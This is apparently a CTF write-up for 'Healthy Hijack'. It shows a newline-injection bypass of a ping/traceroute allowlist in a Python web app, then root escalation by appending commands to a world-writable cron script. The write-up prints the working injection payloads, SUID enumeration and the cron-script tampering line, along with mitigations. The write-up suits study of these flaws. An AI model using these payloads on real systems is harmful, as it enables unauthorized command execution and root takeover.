---
link: 'writeups/kpmg-ctf-2026/healthy-hijack'
title: "Healthy Hijack - KPMG CTF 2026"
description: "Writeup for Healthy Hijack (Parts 1 & 2) from KPMG CTF 2026. Newline injection through a command allowlist bypass, followed by a world-writable root cron script to escalate to root."
date: 2026-10-25 11:52:00
categories:
  - [Writeups, KPMG CTF 2026]
tags:
  - KPMG-CTF-2026
  - Infrastructure
  - Command Injection
  - Privilege Escalation
  - Cron Abuse
---

# KPMG CTF 2026 — Healthy Hijack

---

## Challenge Description

> A "Safe Command Runner" web portal allows only network debugging commands such as `ping`, `traceroute`, and `nslookup`. Obtain both the user flag and the root flag from the container.

**Flags:** Two — user-level (`appuser`) and root-level.

---

## Step 1 — Reconnaissance

The application exposed a single `/run` endpoint that accepted a `cmd` form field. Submitting `ping 1.1.1.1` reached the binary but failed immediately:

```text
ping: socket: Operation not permitted
ping: ⇒ missing cap_net_raw+p capability or setuid?
```

Submitting `id` directly was rejected with an "invalid command" error, confirming the app validated the command name before execution. Common shell separators were blocked too — sending `ping -c 1 127.0.0.1; id` produced only the ping error with no `id` output.

![Command bypass using # trick](/img/posts/kpmg-ctf-2026-01_command_bypass.webp)

---

## Step 2 — Source Code Analysis

Reading `/app/app.py` via the injection revealed the filter implementation:

```python
ALLOWED_COMMANDS = ["ping", "traceroute", "nslookup"]

def is_allowed(cmd):
    return any(cmd.startswith(c) for c in ALLOWED_COMMANDS)

def sanitize(user_input):
    blacklist = [";", "&", "|", "`", "$(", "<"]
    for b in blacklist:
        user_input = user_input.replace(b, "")
    return user_input
```

The application then ran the sanitized input directly in a shell:

```python
subprocess.run(cmd, shell=True, ...)
```

**Key Findings:**
- `is_allowed` only checks that the input **starts with** an allowed command — it does not validate the rest.
- The blacklist removes common shell operators but **does not remove newline characters (`\n`)**.
- `shell=True` passes the full multi-line string to `/bin/sh`, which treats newlines as command separators.

---

## Step 3 — Newline Injection (Part 1: User Flag)

The textarea in the browser submits `\r\n` line endings. A bare newline left a stray `\r` attached to the next command name, causing it to fail. Appending `#` to each line comments out the carriage return:

```text
ping -V #
id #
```

This produced:

```text
uid=1000(appuser) gid=1000(appuser) groups=1000(appuser)
```

Reading `/entrypoint.sh` showed the user flag was written to `/home/appuser/user.txt` with mode `644` at container startup.

![Flag location from entrypoint](/img/posts/kpmg-ctf-2026-02_flag_location_entrypoint.webp)

```text
ping -V #
cat /home/appuser/user.txt #
```

### Flag 1 (User)

```text
KPMG_CTF{5NGFEr8rYdC-SkS6lM0vQnwHTHq0mKr72f8_WeMZcMIN}
```

![User flag](/img/posts/kpmg-ctf-2026-08_healthy_flag1.webp)

---

## Step 4 — Privilege Escalation (Part 2: Root Flag)

With arbitrary command execution as `appuser`, we enumerated the system for privilege-escalation paths.

### Reconnaissance

```text
ping -V #
id #
find / -perm -4000 -type f 2>/dev/null #
```

![Recon as appuser](/img/posts/kpmg-ctf-2026-03_p2_recon.webp)

The SUID search found `/usr/sbin/exim4`. Its command-line options required administrative privileges, so it was a dead end for this instance.

![Finding writable locations](/img/posts/kpmg-ctf-2026-04_p2_find_writable.webp)

### Cron Analysis

Checking `/etc/crontab` revealed the real attack surface:

```cron
* * * * * root /opt/healthcheck.sh
* * * * * root sleep 10 && /opt/healthcheck.sh
* * * * * root sleep 20 && /opt/healthcheck.sh
* * * * * root sleep 30 && /opt/healthcheck.sh
* * * * * root sleep 40 && /opt/healthcheck.sh
* * * * * root sleep 50 && /opt/healthcheck.sh
* * * * * root find /tmp -perm /4000 -delete
```

The health check script ran as **root every ~10 seconds**. Checking its permissions:

![Crontab contents](/img/posts/kpmg-ctf-2026-05_p2_crontab.webp)

```text
-rwxrwxrwx 1 root root ... /opt/healthcheck.sh
```

The file was owned by root but **world-writable (`0777`)**. Its original content was benign:

```sh
#!/bin/sh
# System healthcheck
echo "OK" > /tmp/health.log
```

> [!NOTE]
> The `find /tmp -perm /4000 -delete` cleanup job was a red herring — it cleared any SUID binaries from `/tmp`, so the real path was the writable script.

### Exploiting the Cron Script

We appended flag-copy commands to the script:

```text
ping -V #
printf '\n/bin/cp /root/root.txt /tmp/rootflag\n/bin/chmod 644 /tmp/rootflag\n' >> /opt/healthcheck.sh #
```

![Exploiting the cron job](/img/posts/kpmg-ctf-2026-06_p2_exploit_cron.webp)

After waiting for the next cron execution (~10 seconds), we read the copy:

```text
ping -V #
cat /tmp/rootflag #
```

![Root flag](/img/posts/kpmg-ctf-2026-07_p2_root_flag.webp)

### Cleanup

We restored the original script content and removed the temporary file:

```text
ping -V #
printf '#!/bin/sh\n# System healthcheck\necho "OK" > /tmp/health.log\n' > /opt/healthcheck.sh #
rm -f /tmp/rootflag #
```

### Flag 2 (Root)

```text
KPMG_CTF{Ymllhoq12FPE13ifQowH_8hOefYuEQMea7bGiq1LOuZE}
```

![Root flag confirmed](/img/posts/kpmg-ctf-2026-09_healthy_flag2.webp)

---

## Mitigations

| Vulnerability | Recommended Fix |
|---|---|
| Allowlist bypass via newline injection | Strip `\n` and `\r` in `sanitize()` alongside other shell metacharacters |
| `startswith` logic for command validation | Validate only the first whitespace-delimited token, not the whole string |
| `shell=True` with user input | Use `subprocess.run([cmd, *args], shell=False)` with an explicit argument list |
| World-writable root-owned cron script | Set `/opt/healthcheck.sh` permissions to `0755` or `0700` |

---

## Summary

The challenge combined two weaknesses. First, a command allowlist that used `startswith` without filtering newlines allowed arbitrary shell command injection via a multi-line textarea input. Second, a cron script executed by root every ten seconds had world-writable permissions, letting the low-privilege `appuser` backdoor it to copy the root flag to a readable location. Together they formed a clean two-stage exploit chain from zero-auth RCE to root.
